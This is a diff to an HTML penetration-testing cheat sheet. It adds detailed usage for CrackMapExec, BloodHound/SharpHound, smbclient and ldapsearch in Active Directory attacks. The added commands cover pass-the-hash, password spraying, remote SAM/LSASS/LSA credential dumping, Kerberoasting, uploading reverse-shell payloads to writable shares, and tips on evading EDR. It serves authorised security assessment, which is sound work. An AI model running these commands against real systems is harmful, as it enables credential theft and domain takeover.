@@ -70,7 +70,8 @@
 <!-- ============================= -->
 <!-- 1. Recon & Enumeration        -->
 <!-- ============================= -->
-<div class="tool-section-title"><h2>1. Recon & Enumeration</h2></div>
+<div class="tool-section-title" id="tools-recon"><h2>1. Recon & Enumeration</h2></div>
+
 
 <!-- Nmap Tool Row -->
 <div class="tool-row">
@@ -666,7 +667,8 @@ httpx -l alive.txt -tech-detect -title -status -o tech.txt
 <!-- ============================= -->
 <!-- 2. Web Exploitation           -->
 <!-- ============================= -->
-<div class="tool-section-title"><h2>2. Web Exploitation</h2></div>
+<div class="tool-section-title" id="tools-web"><h2>2. Web Exploitation</h2></div>
+
 
 <div class="tool-row">
   <div class="tool-name" onclick="toggleDetails('burp')">Burp Suite</div>
@@ -2175,7 +2177,8 @@ gobuster dir -u https://target.com -w big.txt -x php,conf,old,txt
 <!-- ============================= -->
 <!-- 3. Credential Attacks         -->
 <!-- ============================= -->
-<div class="tool-section-title"><h2>3. Credential Attacks</h2></div>
+<div class="tool-section-title" id="tools-creds"><h2>3. Credential Attacks</h2></div>
+
 
 <div class="tool-row">
   <div class="tool-name" onclick="toggleDetails('hashcat')">Hashcat</div>
@@ -2862,7 +2865,8 @@ hydra -L users.txt -P pass.txt target.com https-post-form \
 <!-- ============================= -->
 <!-- 4. Infrastructure / AD        -->
 <!-- ============================= -->
-<div class="tool-section-title"><h2>4. Infrastructure / Active Directory</h2></div>
+<div class="tool-section-title" id="tools-ad"><h2>4. Infrastructure / Active Directory</h2></div>
+
 
 <div class="tool-row">
   <div class="tool-name" onclick="toggleDetails('impacket')">Impacket Suite</div>
@@ -3132,38 +3136,728 @@ psexec.py DOMAIN\Administrator@TARGET -hashes :NTHASH
 
 <div class="tool-row">
   <div class="tool-name" onclick="toggleDetails('crackmapexec')">CrackMapExec</div>
-  <div class="tool-details" id="crackmapexec"></div>
+  <div class="tool-details" id="crackmapexec">
+
+    <h2>CrackMapExec (CME) — Lateral Movement & AD Post-Exploitation Swiss Army Knife</h2>
+    <p>
+      CrackMapExec is used for credential spraying, hash/auth testing, user enumeration,
+      command execution, session discovery, LSASS dumping, and lateral movement across
+      Windows/SMB/WinRM/LDAP environments.
+    </p>
+
+    <h3>When to use</h3>
+    <ul>
+      <li>Test credentials across many hosts (valid, invalid, weak)</li>
+      <li>Enumerate SMB shares, sessions, logged-in users</li>
+      <li>Execute commands remotely (SMB/WinRM/WMI)</li>
+      <li>Check for local admin access</li>
+      <li>Dump SAM/LSASS remotely (if allowed)</li>
+      <li>Identify lateral movement paths inside AD</li>
+    </ul>
+
+    <!-- ============================== -->
+    <!-- BASIC CHECKS                   -->
+    <!-- ============================== -->
+
+    <h2>1. Check if credentials are valid</h2>
+    <pre><code>
+cme smb 10.10.0.0/24 -u user -p Password123
+    </code></pre>
+
+    <h3>Pass-the-Hash</h3>
+    <pre><code>
+cme smb 10.10.0.0/24 -u admin -H NTHASH
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- ENUMERATION                    -->
+    <!-- ============================== -->
+
+    <h2>2. Enumerate SMB shares</h2>
+    <pre><code>
+cme smb target -u user -p pass --shares
+    </code></pre>
+
+    <h3>List logged-in users</h3>
+    <pre><code>
+cme smb target -u user -p pass --loggedon-users
+    </code></pre>
+
+    <h3>List sessions</h3>
+    <pre><code>
+cme smb target -u user -p pass --sessions
+    </code></pre>
+
+    <h3>Enumerate LAPS passwords</h3>
+    <pre><code>
+cme ldap target -u user -p pass --laps
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- REMOTE EXECUTION               -->
+    <!-- ============================== -->
+
+    <h2>3. Remote command execution</h2>
+
+    <h3>Via SMB</h3>
+    <pre><code>
+cme smb target -u admin -p pass -x "whoami"
+    </code></pre>
+
+    <h3>Via PowerShell</h3>
+    <pre><code>
+cme winrm target -u admin -p pass -x "ipconfig"
+    </code></pre>
+
+    <h3>Via WMI</h3>
+    <pre><code>
+cme wmi target -u admin -p pass -x "hostname"
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- CREDENTIAL HARVESTING          -->
+    <!-- ============================== -->
+
+    <h2>4. Credential harvesting modules</h2>
+
+    <h3>Dump SAM remotely</h3>
+    <pre><code>
+cme smb target -u admin -p pass --sam
+    </code></pre>
+
+    <h3>Dump LSASS (if possible)</h3>
+    <pre><code>
+cme smb target -u admin -p pass --lsass
+    </code></pre>
+
+    <h3>Dump LSA secrets</h3>
+    <pre><code>
+cme smb target -u admin -p pass --lsa
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- PASSWORD SPRAYING              -->
+    <!-- ============================== -->
+
+    <h2>5. Password spraying</h2>
+    <pre><code>
+cme smb domain.local -u users.txt -p "Spring2024!"
+    </code></pre>
+
+    <h3>Time-safe spraying</h3>
+    <pre><code>
+cme smb domain.local -u users.txt -p Password123 --no-bruteforce
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- KERBEROAST / ASREPROAST        -->
+    <!-- ============================== -->
+
+    <h2>6. Kerberos attacks (via CME)</h2>
+
+    <h3>AS-REP Roast</h3>
+    <pre><code>
+cme ldap domain.local -u users.txt -p '' --asreproast out.asreproast
+    </code></pre>
+
+    <h3>Kerberoast</h3>
+    <pre><code>
+cme ldap domain.local -u user -p pass --kerberoasting out.kerberoast
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- LOCAL ADMIN DISCOVERY          -->
+    <!-- ============================== -->
+
+    <h2>7. Local admin rights detection</h2>
+    <pre><code>
+cme smb 10.10.0.0/24 -u admin -H HASH --local-auth
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- WORKFLOW                       -->
+    <!-- ============================== -->
+
+    <h2>8. Practical workflow</h2>
+    <pre><code>
+# Step 1 - Validate credentials
+cme smb 10.10.0.0/24 -u user -p pass
+
+# Step 2 - Identify local admin paths
+cme smb 10.10.0.0/24 -u admin -H HASH --local-auth
+
+# Step 3 - Enumerate shares / sessions
+cme smb host -u admin -H HASH --shares
+cme smb host --sessions
+
+# Step 4 - Harvest creds
+cme smb host --sam
+cme smb host --lsa
+
+# Step 5 - Execute and pivot
+cme winrm host -u admin -H HASH -x "powershell -ep bypass ..."
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- TROUBLESHOOTING                -->
+    <!-- ============================== -->
+
+    <h2>9. Troubleshooting</h2>
+    <ul>
+      <li><strong>SMB login failed:</strong> try <code>--local-auth</code> or UPN</li>
+      <li><strong>Timeouts:</strong> hosts firewalled, use <code>--timeout</code></li>
+      <li><strong>Modules missing:</strong> run <code>cme --update</code></li>
+      <li><strong>LSASS dump blocked:</strong> EDR engaged → use Procdump/Nanodump instead</li>
+    </ul>
+
+  </div>
 </div>
 
-<div class="tool-row">
-  <div class="tool-name" onclick="toggleDetails('kerbrute')">Kerbrute</div>
-  <div class="tool-details" id="kerbrute"></div>
-</div>
+
 
 <div class="tool-row">
   <div class="tool-name" onclick="toggleDetails('bloodhound')">Bloodhound + SharpHound</div>
-  <div class="tool-details" id="bloodhound"></div>
+  <div class="tool-details" id="bloodhound">
+
+    <h2>BloodHound + SharpHound — AD Attack Path Mapping</h2>
+    <p>
+      BloodHound visualizes Active Directory privilege relationships, lateral movement paths,
+      ACL abuses, delegation issues, and misconfigurations.  
+      SharpHound is the collector that gathers AD data (sessions, ACLs, trust relationships, SPNs, etc.).
+    </p>
+
+    <h3>When to use</h3>
+    <ul>
+      <li>Mapping attack paths from low-priv user → Domain Admin</li>
+      <li>Identifying misconfigured ACLs (WriteDACL, GenericAll, etc.)</li>
+      <li>Enumerating local admin rights across hosts</li>
+      <li>Mapping Kerberos delegation abuse paths</li>
+      <li>Spotting privilege escalation vectors in AD</li>
+      <li>Visualizing lateral movement opportunities</li>
+    </ul>
+
+    <!-- ============================== -->
+    <!-- SHARPHOUND COLLECTION          -->
+    <!-- ============================== -->
+
+    <h2>1. Running SharpHound (Windows)</h2>
+
+    <h3>Basic collection</h3>
+    <pre><code>
+SharpHound.exe -c All
+    </code></pre>
+
+    <h3>Recommended collection set (fast, common)</h3>
+    <pre><code>
+SharpHound.exe -c Session,LocalAdmin,Trusts,ACL,GroupMembership
+    </code></pre>
+
+    <h3>Output location</h3>
+    <p>Creates a ZIP file containing JSON dumps → import to BloodHound.</p>
+
+    <!-- ============================== -->
+    <!-- POWERSHELL VERSION             -->
+    <!-- ============================== -->
+
+    <h2>2. PowerShell SharpHound (stealthier)</h2>
+    <pre><code>
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory .\
+    </code></pre>
+
+    <p>Useful when EXE execution is blocked.</p>
+
+    <!-- ============================== -->
+    <!-- LINUX COLLECTION               -->
+    <!-- ============================== -->
+
+    <h2>3. Linux collection using BloodHound Python ingestor</h2>
+
+    <h3>Using bloodhound-python</h3>
+    <pre><code>
+bloodhound-python -d domain.local -u user -p pass \
+  -dc dc.domain.local -ns dc.domain.local -c All
+    </code></pre>
+
+    <h3>Kerberos auth (ticket)</h3>
+    <pre><code>
+KRB5CCNAME=ticket.ccache \
+bloodhound-python -d domain.local -k -c All
+    </code></pre>
+
+    <p>No password needed if you have a Kerberos TGT.</p>
+
+    <!-- ============================== -->
+    <!-- IMPORTING INTO BLOODHOUND      -->
+    <!-- ============================== -->
+
+    <h2>4. Importing data into BloodHound</h2>
+
+    <h3>Start Neo4j</h3>
+    <pre><code>
+neo4j console
+    </code></pre>
+
+    <h3>Launch BloodHound</h3>
+    <pre><code>
+bloodhound
+    </code></pre>
+
+    <h3>Import ZIP</h3>
+    <p>Drag the generated ZIP from SharpHound into the UI.</p>
+
+    <!-- ============================== -->
+    <!-- COMMON ATTACK QUERIES          -->
+    <!-- ============================== -->
+
+    <h2>5. Essential BloodHound Queries</h2>
+
+    <h3>Find shortest path to Domain Admins</h3>
+    <pre><code>
+Queries → Shortest path to Domain Admins
+    </code></pre>
+
+    <h3>Users with GenericAll on any object</h3>
+    <pre><code>
+Query → Users with GenericAll privileges
+    </code></pre>
+
+    <h3>Kerberoastable users</h3>
+    <pre><code>
+Query → Kerberoastable Users
+    </code></pre>
+
+    <h3>AS-REP Roastable users</h3>
+    <pre><code>
+Query → AS-REP Roastable Users
+    </code></pre>
+
+    <h3>Computers where current user is local admin</h3>
+    <pre><code>
+Query → Local Admin Rights
+    </code></pre>
+
+    <h3>Users with DCSync privileges</h3>
+    <pre><code>
+Query → DCSync Rights
+    </code></pre>
+
+    <h3>Unconstrained delegation</h3>
+    <pre><code>
+Query → Unconstrained Delegation Computers
+    </code></pre>
+
+    <h3>Constrained delegation</h3>
+    <pre><code>
+Query → Constrained Delegation Computers
+    </code></pre>
+
+    <h3>Shadow Credentials opportunities</h3>
+    <pre><code>
+Query → Objects Where You Can Write SPN / KeyCredentials
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- PRIVESC / ATTACK PATH NOTES    -->
+    <!-- ============================== -->
+
+    <h2>6. Most common real-world escalation paths</h2>
+    <ul>
+      <li><strong>WriteDACL / GenericAll → user takeover</strong></li>
+      <li><strong>WriteSPN → Kerberoastable service creation</strong></li>
+      <li><strong>Local admin rights → lateral movement → token abuse</strong></li>
+      <li><strong>Shadow Credentials → full impersonation rights</strong></li>
+      <li><strong>Unconstrained delegation → ticket theft → DA</strong></li>
+      <li><strong>GPO edit rights → startup script RCE</strong></li>
+      <li><strong>Kerberoast → cracked hash → privilege escalation</strong></li>
+      <li><strong>AS-REP Roast → no-preauth user → easy crack</strong></li>
+      <li><strong>DCSync rights → dump NTDS → compromise domain</strong></li>
+    </ul>
+
+    <!-- ============================== -->
+    <!-- TIPS                           -->
+    <!-- ============================== -->
+
+    <h2>7. SharpHound Collection Tips</h2>
+    <ul>
+      <li>Use <strong>-c All</strong> only when needed — it’s noisy</li>
+      <li>Minimal fast set: <strong>Session, LocalAdmin, ACL</strong></li>
+      <li>Run from a domain-joined machine for full data</li>
+      <li>Use <strong>bloodhound-python</strong> from Linux footholds</li>
+    </ul>
+
+    <!-- ============================== -->
+    <!-- TROUBLESHOOTING                -->
+    <!-- ============================== -->
+
+    <h2>8. Troubleshooting</h2>
+    <ul>
+      <li><strong>Empty graph:</strong> bad base DN or failed collection</li>
+      <li><strong>Neo4j refused connection:</strong> auth mismatch → reset via neo4j.conf</li>
+      <li><strong>SharpHound blocked:</strong> AV/EDR → use PowerShell version</li>
+      <li><strong>bloodhound-python slow:</strong> use <code>-c</code> to limit collection</li>
+    </ul>
+
+  </div>
 </div>
 
-<div class="tool-row">
+
+<div class="tool-row"> 
   <div class="tool-name" onclick="toggleDetails('smbclient')">SMBClient</div>
-  <div class="tool-details" id="smbclient"></div>
+  <div class="tool-details" id="smbclient">
+
+    <h2>SMBClient — Interacting with SMB Shares from Linux</h2>
+    <p>
+      smbclient is a Linux SMB tool allowing authentication, share enumeration,
+      file downloads, uploads, and interaction with Windows shares.
+      Useful for AD recon, credential hunting, lateral movement, and checking permissions.
+    </p>
+
+    <h3>When to use</h3>
+    <ul>
+      <li>Listing accessible SMB shares</li>
+      <li>Accessing Windows file servers from Linux</li>
+      <li>Downloading SYSVOL/NETLOGON files</li>
+      <li>Searching for creds in shared directories</li>
+      <li>Testing user share permissions</li>
+      <li>Uploading payloads (if write access)</li>
+    </ul>
+
+    <!-- ============================== -->
+    <!-- ENUMERATION                    -->
+    <!-- ============================== -->
+
+    <h2>1. List shares on a host</h2>
+    <h3>Authenticated</h3>
+    <pre><code>
+smbclient -L //target -U 'user%password'
+    </code></pre>
+
+    <h3>Anonymous</h3>
+    <pre><code>
+smbclient -L //target -N
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- CONNECT TO SHARE               -->
+    <!-- ============================== -->
+
+    <h2>2. Connect to a share</h2>
+    <pre><code>
+smbclient //target/SHARE -U 'user%password'
+    </code></pre>
+
+    <h3>Anonymous access</h3>
+    <pre><code>
+smbclient //target/SHARE -N
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- FILE OPERATIONS                -->
+    <!-- ============================== -->
+
+    <h2>3. Common commands inside smbclient shell</h2>
+    <pre><code>
+ls           # list files
+cd folder    # change directory
+get file     # download
+put file     # upload
+mask *       # wildcard matching
+recurse on   # recursion for get/put
+prompt off   # automate
+mget *       # download everything
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- SYSVOL / NETLOGON LOOT         -->
+    <!-- ============================== -->
+
+    <h2>4. Dump SYSVOL & NETLOGON (GPOs, scripts, passwords)</h2>
+
+    <h3>SYSVOL</h3>
+    <pre><code>
+smbclient //dc.domain.local/SYSVOL -U 'domain\\user%pass'
+    </code></pre>
+
+    <h3>NETLOGON</h3>
+    <pre><code>
+smbclient //dc.domain.local/NETLOGON -U 'domain\\user%pass'
+    </code></pre>
+
+    <p>Look for:</p>
+    <ul>
+      <li>Startup scripts</li>
+      <li>GPP password files (old vuln)</li>
+      <li>Backup files containing creds</li>
+    </ul>
+
+    <!-- ============================== -->
+    <!-- WRITE ACCESS ABUSE             -->
+    <!-- ============================== -->
+
+    <h2>5. If share is writable</h2>
+
+    <h3>Upload a reverse shell</h3>
+    <pre><code>
+put shell.exe
+    </code></pre>
+
+    <h3>Upload malicious script for execution</h3>
+    <pre><code>
+put script.ps1
+    </code></pre>
+
+    <h3>Pivot using service pointing to share</h3>
+    <p>
+      Some services read configs/scripts from SMB shares; writable share = RCE.
+    </p>
+
+    <!-- ============================== -->
+    <!-- MOUNT SMB SHARE                -->
+    <!-- ============================== -->
+
+    <h2>6. Mount SMB on Linux</h2>
+
+    <pre><code>
+sudo mount -t cifs //target/SHARE /mnt/smb \
+  -o username=user,password=pass,domain=DOMAIN
+    </code></pre>
+
+    <p>Useful for large recursive downloads.</p>
+
+    <!-- ============================== -->
+    <!-- WORKFLOW                       -->
+    <!-- ============================== -->
+
+    <h2>7. Practical workflow</h2>
+    <pre><code>
+# Step 1 — List shares
+smbclient -L //target -U 'user%pass'
+
+# Step 2 — Access share
+smbclient //target/shared -U 'user%pass'
+
+# Step 3 — Search for creds
+ls
+recurse on
+prompt off
+mget *
+
+# Step 4 — Dump SYSVOL
+smbclient //dc/SYSVOL -U 'domain\\user%pass'
+
+# Step 5 — Check for writable shares → upload payload
+put payload.exe
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- TROUBLESHOOTING                -->
+    <!-- ============================== -->
+
+    <h2>8. Troubleshooting</h2>
+    <ul>
+      <li><strong>NT_STATUS_ACCESS_DENIED:</strong> bad creds or no share permission</li>
+      <li><strong>Broken filenames:</strong> add <code>-m SMB3</code></li>
+      <li><strong>Timeouts:</strong> firewall filtering SMB ports (445/139)</li>
+      <li><strong>Anonymous fails?</strong> Server disabled guest access</li>
+    </ul>
+
+  </div>
 </div>
 
-<div class="tool-row">
-  <div class="tool-name" onclick="toggleDetails('rpcclient')">RPCClient</div>
-  <div class="tool-details" id="rpcclient"></div>
-</div>
 
 <div class="tool-row">
   <div class="tool-name" onclick="toggleDetails('ldapsearch')">LDAPSearch</div>
-  <div class="tool-details" id="ldapsearch"></div>
+  <div class="tool-details" id="ldapsearch">
+
+    <h2>LDAPSearch — Active Directory Enumeration via LDAP</h2>
+    <p>
+      ldapsearch is used during AD assessments to query LDAP directly and extract information
+      about users, groups, computers, SPNs, policies, and domain configuration.  
+      Works with valid creds or anonymous binds (if misconfigured).
+    </p>
+
+    <h3>When to use</h3>
+    <ul>
+      <li>Enumerating domain users/groups without PowerShell</li>
+      <li>Linux-side recon inside a Windows environment</li>
+      <li>Extracting SPNs (Kerberoasting targets)</li>
+      <li>Dumping GPOs, computer objects, trust relationships</li>
+      <li>Checking for anonymous LDAP binding exposure</li>
+      <li>Pivoting from Linux foothold to AD context</li>
+    </ul>
+
+    <!-- ============================== -->
+    <!-- BASIC CONNECTION                -->
+    <!-- ============================== -->
+
+    <h2>1. Basic bind</h2>
+    <pre><code>
+ldapsearch -x -H ldap://DOMAIN_CONTROLLER -D "user@domain.local" -W -b "dc=domain,dc=local"
+    </code></pre>
+
+    <p>-x = simple auth, -H = host, -D = bind DN, -b = search base.</p>
+
+    <!-- ============================== -->
+    <!-- ANONYMOUS BIND                 -->
+    <!-- ============================== -->
+
+    <h2>2. Anonymous bind (if allowed)</h2>
+    <pre><code>
+ldapsearch -x -H ldap://dc.domain.local -b "dc=domain,dc=local"
+    </code></pre>
+
+    <p>If this works → major domain misconfiguration.</p>
+
+    <!-- ============================== -->
+    <!-- ENUM USERS / GROUPS            -->
+    <!-- ============================== -->
+
+    <h2>3. Enumerate domain users</h2>
+    <pre><code>
+ldapsearch -x -H ldap://dc.domain.local \
+  -D "user@domain.local" -W \
+  -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName
+    </code></pre>
+
+    <h3>Show all attributes of a specific user</h3>
+    <pre><code>
+ldapsearch -x -H ldap://dc.domain.local \
+  -D "user@domain.local" -W \
+  -b "dc=domain,dc=local" "(sAMAccountName=jdoe)"
+    </code></pre>
+
+    <h2>4. Enumerate domain groups</h2>
+    <pre><code>
+ldapsearch -x -H ldap://dc.domain.local \
+  -D "user@domain.local" -W \
+  -b "dc=domain,dc=local" "(objectClass=group)" cn
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- SPN ENUMERATION (KERBEROAST)  -->
+    <!-- ============================== -->
+
+    <h2>5. Enumerate SPNs (Kerberoast targets)</h2>
+
+    <pre><code>
+ldapsearch -x -H ldap://dc.domain.local \
+  -D "user@domain.local" -W \
+  -b "dc=domain,dc=local" "(servicePrincipalName=*)" \
+  servicePrincipalName sAMAccountName
+    </code></pre>
+
+    <p>Any user with SPN = potential Kerberoasting victim.</p>
+
+    <!-- ============================== -->
+    <!-- COMPUTERS / TRUSTS             -->
+    <!-- ============================== -->
+
+    <h2>6. Enumerate computer objects</h2>
+    <pre><code>
+ldapsearch -x -H ldap://dc.domain.local \
+  -D "user@domain.local" -W \
+  -b "dc=domain,dc=local" "(objectClass=computer)" \
+  dNSHostName operatingSystem
+    </code></pre>
+
+    <h2>7. Enumerate domain trusts</h2>
+    <pre><code>
+ldapsearch -x -H ldap://dc.domain.local \
+  -D "user@domain.local" -W \
+  -b "dc=domain,dc=local" "(objectClass=trustedDomain)" \
+  cn trustPartner trustDirection
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- PASSWORD POLICY                -->
+    <!-- ============================== -->
+
+    <h2>8. Enumerate password policy</h2>
+    <pre><code>
+ldapsearch -x -H ldap://dc.domain.local \
+  -D "user@domain.local" -W \
+  -b "cn=Default Domain Policy,cn=System,dc=domain,dc=local"
+    </code></pre>
+
+    <p>Look for <code>maxPwdAge</code>, <code>minPwdAge</code>, <code>pwdHistoryLength</code>, etc.</p>
+
+    <!-- ============================== -->
+    <!-- GPO ENUMERATION                -->
+    <!-- ============================== -->
+
+    <h2>9. Enumerate GPOs</h2>
+    <pre><code>
+ldapsearch -x -H ldap://dc.domain.local \
+  -D "user@domain.local" -W \
+  -b "cn=Policies,cn=System,dc=domain,dc=local" "(objectClass=groupPolicyContainer)" \
+  displayName gPCFileSysPath
+    </code></pre>
+
+    <p>gPCFileSysPath points to SYSVOL GPO folders (lootable).</p>
+
+    <!-- ============================== -->
+    <!-- SHORTCUT FILTERS               -->
+    <!-- ============================== -->
+
+    <h2>10. Useful LDAP filters</h2>
+
+    <h3>Only enabled user accounts</h3>
+    <pre><code>(userAccountControl:1.2.840.113556.1.4.803:=512)</code></pre>
+
+    <h3>Admins</h3>
+    <pre><code>(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)</code></pre>
+
+    <h3>Computers only</h3>
+    <pre><code>(objectClass=computer)</code></pre>
+
+    <h3>Locked out users</h3>
+    <pre><code>(lockoutTime>=1)</code></pre>
+
+    <!-- ============================== -->
+    <!-- WORKFLOW                       -->
+    <!-- ============================== -->
+
+    <h2>11. Practical AD workflow</h2>
+    <pre><code>
+# Step 1 - Validate bind
+ldapsearch -x -H ldap://dc -D "user@domain" -W -b "dc=domain,dc=local"
+
+# Step 2 - Enumerate users
+ldapsearch ... "(objectClass=user)"
+
+# Step 3 - Find SPNs → kerberoast
+ldapsearch ... "(servicePrincipalName=*)"
+
+# Step 4 - Dump groups, GPOs, trusts
+ldapsearch ... "(objectClass=group)"
+ldapsearch ... "(objectClass=trustedDomain)"
+
+# Step 5 - Map privilege escalation paths
+Analyze SPNs, password policy, group memberships.
+    </code></pre>
+
+    <!-- ============================== -->
+    <!-- TROUBLESHOOTING                -->
+    <!-- ============================== -->
+
+    <h2>12. Troubleshooting</h2>
+    <ul>
+      <li><strong>“Invalid credentials”</strong> → use UPN format (user@domain)</li>
+      <li><strong>“No such object”</strong> → wrong base DN</li>
+      <li><strong>No results?</strong> → Ldap over LDAPS enforced (use <code>ldaps://</code>)</li>
+      <li><strong>SSL errors</strong> → add <code>-ZZ</code> to start TLS</li>
+    </ul>
+
+  </div>
 </div>
+
 
 <!-- ============================= -->
 <!-- 5. Post-Exploitation (Linux)  -->
 <!-- ============================= -->
-<div class="tool-section-title"><h2>5. Post-Exploitation - Linux</h2></div>
+<div class="tool-section-title" id="tools-postlinux"><h2>5. Post-Exploitation - Linux</h2></div>
+
 
 <div class="tool-row">
   <div class="tool-name" onclick="toggleDetails('linpeas')">LinPEAS</div>
@@ -3826,7 +4520,8 @@ mount -o bind / /mnt
 <!-- ============================= -->
 <!-- 6. Post-Exploitation (Windows) -->
 <!-- ============================= -->
-<div class="tool-section-title"><h2>6. Post-Exploitation - Windows</h2></div>
+<div class="tool-section-title" id="tools-postwindows"><h2>6. Post-Exploitation - Windows</h2></div>
+
 
 <div class="tool-row">
   <div class="tool-name" onclick="toggleDetails('winpeas')">WinPEAS</div>
@@ -4605,7 +5300,8 @@ evil-winrm -i next-host -u DA -H HASH
 <!-- ============================= -->
 <!-- 7. Network / Packet Tools     -->
 <!-- ============================= -->
-<div class="tool-section-title"><h2>7. Network / Packet Capture</h2></div>
+<div class="tool-section-title" id="tools-network"><h2>7. Network / Packet Capture</h2></div>
+
 
 <div class="tool-row">
   <div class="tool-name" onclick="toggleDetails('tcpdump')">tcpdump</div>
@@ -4921,7 +5617,7 @@ Export Objects → HTTP
 <!-- ============================= -->
 <!-- 8. Cloud / Containers         -->
 <!-- ============================= -->
-<div class="tool-section-title"><h2>8. Cloud & Containers</h2></div>
+<div class="tool-section-title" id="tools-cloud"><h2>8. Cloud & Containers</h2></div>
 
 <div class="tool-row">
   <div class="tool-name" onclick="toggleDetails('kubectl')">kubectl</div>
@@ -5382,7 +6078,7 @@ aws ec2 run-instances \
 <!-- ============================= -->
 <!-- 9. Wireless / MITM            -->
 <!-- ============================= -->
-<div class="tool-section-title"><h2>9. Wireless / MITM</h2></div>
+<div class="tool-section-title" id="tools-wireless"><h2>9. Wireless / MITM</h2></div>
 
 <div class="tool-row">
   <div class="tool-name" onclick="toggleDetails('aircrack')">Aircrack-ng</div>
